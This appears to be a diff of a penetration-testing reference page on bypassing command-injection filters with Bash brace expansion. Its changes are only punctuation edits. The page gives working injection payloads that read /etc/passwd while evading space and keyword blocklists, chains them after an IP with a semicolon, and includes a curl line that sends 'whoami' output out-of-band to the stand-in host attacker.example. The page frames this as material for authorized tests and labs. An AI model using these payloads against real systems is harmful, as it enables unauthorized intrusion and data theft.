@@ -1,6 +1,6 @@
 ---
 title: "Command injection filter bypass with brace expansion"
-description: "Using Bash brace expansion—{cat,/etc/passwd}, {ls,-la}—to split a command into comma-separated tokens that carry no spaces and no filtered keyword, so a literal blocklist misses the payload."
+description: "Using Bash brace expansion, {cat,/etc/passwd}, {ls,-la}, to split a command into comma-separated tokens that carry no spaces and no filtered keyword, so a literal blocklist misses the payload."
 keywords:
   - command injection
   - brace expansion
@@ -12,13 +12,13 @@ keywords:
 
 # Brace expansion
 
-Brace expansion is a Bash construct that rewrites `{a,b,c}` into the separate words `a b c` **before** any other processing—before word splitting, before the command even runs. Because the expansion produces the argument separators itself, `{cat,/etc/passwd}` becomes `cat /etc/passwd` with no literal space in the payload and no contiguous `cat /etc/passwd` substring for a filter to match. A blocklist that inspects the raw input sees a comma-delimited brace group; the shell sees a command and its argument.
+Brace expansion is a Bash construct that rewrites `{a,b,c}` into the separate words `a b c` **before** any other processing, before word splitting, before the command even runs. Because the expansion produces the argument separators itself, `{cat,/etc/passwd}` becomes `cat /etc/passwd` with no literal space in the payload and no contiguous `cat /etc/passwd` substring for a filter to match. A blocklist that inspects the raw input sees a comma-delimited brace group; the shell sees a command and its argument.
 
 > **Scope.** For authorized penetration tests, red-team engagements, and CTF labs against systems you are contracted to assess. Executing commands without written authorization is unlawful.
 
 ## Why the shell normalizes it away
 
-Brace expansion runs first in Bash's expansion order. `{cat,/etc/passwd}` expands to two words—`cat` and `/etc/passwd`—exactly as if a space had separated them. The shell treats the comma as the in-group delimiter and discards the braces. A filter operating on the request string never sees `cat /etc/passwd`, `cat␣`, or any whitespace; it sees `{cat,/etc/passwd}`, which rarely appears on a keyword blocklist. This defeats two common controls at once: **space filters** and **literal-command filters**.
+Brace expansion runs first in Bash's expansion order. `{cat,/etc/passwd}` expands to two words, `cat` and `/etc/passwd`, exactly as if a space had separated them. The shell treats the comma as the in-group delimiter and discards the braces. A filter operating on the request string never sees `cat /etc/passwd`, `cat␣`, or any whitespace; it sees `{cat,/etc/passwd}`, which rarely appears on a keyword blocklist. This defeats two common controls at once: **space filters** and **literal-command filters**.
 
 ## Payloads
 
@@ -35,7 +35,7 @@ Classic probes, assuming a POSIX/Bash sink where a space or the word `cat` is bl
 
 A trailing empty element (`{id,}`) yields just `id` while still wrapping it in a brace group, which hides a short keyword from substring matching.
 
-Chaining a separator still works—brace expansion composes with the usual metacharacters:
+Chaining a separator still works, brace expansion composes with the usual metacharacters:
 
 ```
 127.0.0.1;{cat,/etc/passwd}
@@ -49,7 +49,7 @@ Reconstructing a flagged binary path when `/bin` or slashes-plus-name are filter
 {/usr/bin/id,}
 ```
 
-Combine with other space-free tricks when braces alone are not enough—for example feeding brace output through a pipe, or pairing with `${IFS}` where a tool rejects commas in a specific position:
+Combine with other space-free tricks when braces alone are not enough, for example feeding brace output through a pipe, or pairing with `${IFS}` where a tool rejects commas in a specific position:
 
 ```
 {curl,http://OOB_ID.attacker.example/$(whoami)}
@@ -65,5 +65,5 @@ The brace group here keeps the whole invocation space-free while still issuing a
 
 ## References
 
-- [PayloadsAllTheThings: Command Injection — Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
+- [PayloadsAllTheThings: Command Injection, Bypass without space](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 - [Bash Reference Manual: Brace Expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html)
